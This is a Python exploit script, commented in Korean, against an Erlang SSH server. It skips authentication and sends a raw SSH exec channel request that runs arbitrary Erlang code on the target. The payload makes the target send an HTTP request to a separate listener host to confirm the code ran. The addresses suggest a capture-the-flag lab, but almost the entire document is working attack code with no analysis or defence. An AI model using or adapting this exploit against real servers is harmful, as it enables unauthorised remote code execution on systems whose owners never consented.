#!/usr/bin/env python3
import socket, struct, time

HOST = "10.129.245.237"  # Erlang SSH 서버 IP
PORT = 2222              # SSH 포트

def string_payload(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack(">I", len(b)) + b

def pad_packet(payload: bytes, block_size: int = 8) -> bytes:
    total = len(payload) + 5
    pad_len = block_size - (total % block_size)
    if pad_len < 4: pad_len += block_size
    pkt_len = len(payload) + pad_len + 1
    return (
        struct.pack(">I", pkt_len) +
        bytes([pad_len]) +
        payload +
        b"\x00" * pad_len
    )

def build_kexinit() -> bytes:
    cookie = b"\x00" * 16
    def nl(l): return string_payload(",".join(l))
    return (
        b"\x14" + cookie +
        nl(["diffie-hellman-group14-sha1"]) +
        nl(["ssh-rsa"]) +
        nl(["aes128-ctr"])*2 +
        nl(["hmac-sha1"])*2 +
        nl(["none"])*2 +
        nl([])*2 +
        b"\x00" + struct.pack(">I", 0)
    )

def build_channel_open(channel_id: int = 0) -> bytes:
    return (
        b"\x5a" +
        string_payload("session") +
        struct.pack(">I", channel_id) +
        struct.pack(">I", 0x100000) +
        struct.pack(">I", 0x10000)
    )

def build_channel_request(channel_id: int = 0, command: str = "") -> bytes:
    # want_reply = true (0x01)
    return (
        b"\x62" +
        struct.pack(">I", channel_id) +
        string_payload("exec") +
        b"\x01" +
        string_payload(command)
    )

def send_packet(sock, payload):
    sock.sendall(pad_packet(payload))

def recv_ssh_packet_body(sock, timeout=5.0):
    sock.settimeout(timeout)
    # 1) packet_length(4) + padding_length(1)
    hdr = sock.recv(5)
    if len(hdr) < 5:
        return None
    pkt_len = struct.unpack(">I", hdr[:4])[0]
    # 2) payload+padding
    rem = pkt_len - 1
    data = b""
    while len(data) < rem:
        chunk = sock.recv(rem - len(data))
        if not chunk:
            break
        data += chunk
    return data  # [payload + padding]

def main():
    # Erlang HTTP HEAD 요청 후 상태코드를 터미널에 출력하는 Erlang 페이로드
    erl_cmd = (
        'inets:start(), '
        'L = case httpc:request(head, {"http://10.10.14.70:8080", []}, [], []) of '
        '{ok, {{_, Code, _}, _, _}} -> integer_to_list(Code); '
        '{error, Err}        -> io_lib:format("~p", [Err]) end, '
        'io:format("~s", [lists:flatten(L)]).'
    )

    try:
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            # Banner
            s.sendall(b"SSH-2.0-Exploit\r\n")
            s.recv(1024)

            # 1) KEXINIT
            send_packet(s, build_kexinit())
            time.sleep(0.1)
            try: s.recv(4096)
            except socket.timeout: pass

            # 2) CHANNEL_OPEN
            send_packet(s, build_channel_open())
            time.sleep(0.1)

            # 3) CHANNEL_REQUEST(exec)
            print("[*] Sending exec with httpc 페이로드…")
            send_packet(s, build_channel_request(command=erl_cmd))

            # 4) 응답에서 SSH_MSG_CHANNEL_DATA(94)를 기다려서 출력
            start = time.time()
            while time.time() - start < 5:
                body = recv_ssh_packet_body(s, timeout=1)
                if not body:
                    continue
                msg_type = body[0]
                if msg_type == 94:  # SSH_MSG_CHANNEL_DATA
                    # 구조: byte(type) + uint32(recipient) + string(data)
                    _, _, data_part = body[0], body[1:5], body[5:]
                    # data_part = 4바이트 길이 + 실제 데이터
                    data_len = struct.unpack(">I", data_part[:4])[0]
                    data = data_part[4:4+data_len]
                    print("[+] HTTP 응답 코드 또는 에러:", data.decode())
                    return
            print("[-] 채널 데이터가 5초 내에 도착하지 않았습니다.")
    except Exception as e:
        print("[!] 오류:", e)

if __name__ == "__main__":
    main()

